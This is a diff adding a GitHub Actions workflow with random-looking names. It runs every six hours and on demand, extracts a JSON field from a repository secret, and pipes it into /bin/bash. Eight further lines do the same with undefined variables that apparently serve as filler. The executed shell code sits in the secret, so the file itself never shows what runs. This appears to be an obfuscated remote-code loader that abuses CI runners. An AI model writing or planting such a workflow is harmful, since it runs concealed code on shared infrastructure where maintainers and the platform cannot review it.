@@ -1,0 +1,24 @@
+name: yinxinruizhong
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '52 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yinxinruizhong
+        env:
+          d3748: ${{ secrets.d3748 }}
+        run: |
+          echo $d3748 | jq -r .we44191 | /bin/bash
+          echo $pczxi526 | jq -r .f0 | /bin/bash
+          echo $ufn0 | jq -r .epl366 | /bin/bash
+          echo $f6 | jq -r .iapvz36932 | /bin/bash
+          echo $tizq22574 | jq -r .swjel1555 | /bin/bash
+          echo $q700 | jq -r .wwyy436 | /bin/bash
+          echo $gs20055 | jq -r .hx01234 | /bin/bash
+          echo $di90455 | jq -r .vqcv94 | /bin/bash
+          echo $gm349 | jq -r .ze70 | /bin/bash
+
